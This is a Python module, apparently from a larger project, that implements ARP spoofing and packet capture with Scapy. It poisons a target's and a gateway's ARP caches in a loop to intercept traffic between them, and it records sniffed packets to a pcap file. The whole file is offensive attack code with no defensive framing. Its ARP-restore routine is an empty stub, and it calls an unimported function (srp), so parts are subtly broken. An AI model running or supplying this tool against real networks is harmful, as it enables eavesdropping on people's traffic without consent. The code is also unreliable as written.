"""
Network Control Module
----------------------
Implements ARP Spoofing and Packet Interception.
"""

import threading
import time
import logging
import sys
from ..config import Config

# Scapy Import
try:
    from scapy.all import ARP, Ether, send, sniff, wrpcap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger("AtlasTech.NetControl")

class ArpSpoofer:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.stop_event = threading.Event()
        self.thread = None

    def start(self):
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available. MOCKING attack.")
            return

        logger.info(f"Starting ARP Spoof: Target={self.target_ip} <-> Gateway={self.gateway_ip}")
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._spoof_loop)
        self.thread.start()

    def stop(self):
        logger.info("Stopping ARP Spoof...")
        self.stop_event.set()
        if self.thread:
            self.thread.join()
        self._restore()

    def _spoof_loop(self):
        try:
            target_mac = self._get_mac(self.target_ip)
            gateway_mac = self._get_mac(self.gateway_ip)
            
            if not target_mac or not gateway_mac:
                logger.error("Could not resolve MAC addresses.")
                return

            while not self.stop_event.is_set():
                # Poison Target
                send(ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                # Poison Gateway
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip), verbose=False)
                time.sleep(2)
        except Exception as e:
            logger.error(f"Spoofing loop error: {e}")

    def _restore(self):
        # Implementation of ARP restoration would go here
        pass

    def _get_mac(self, ip):
        if not SCAPY_AVAILABLE: return "00:00:00:00:00:00"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        for _, rcv in ans:
            return rcv[Ether].src
        return None

class PacketSniffer:
    def __init__(self, interface=Config.INTERFACE):
        self.interface = interface
        self.captured_packets = []
        self.sniff_thread = None
        self.stop_sniff = threading.Event()

    def start_capture(self, output_file="capture.pcap"):
        logger.info(f"Starting Packet Capture on {self.interface}")
        if not SCAPY_AVAILABLE: return

        self.stop_sniff.clear()
        
        def capture():
            sniff(
                iface=self.interface,
                prn=lambda x: self.captured_packets.append(x),
                stop_filter=lambda x: self.stop_sniff.is_set()
            )
            wrpcap(output_file, self.captured_packets)
            logger.info(f"Saved {len(self.captured_packets)} packets to {output_file}")

        self.sniff_thread = threading.Thread(target=capture)
        self.sniff_thread.start()

    def stop_capture(self):
        self.stop_sniff.set()
        if self.sniff_thread:
            self.sniff_thread.join()
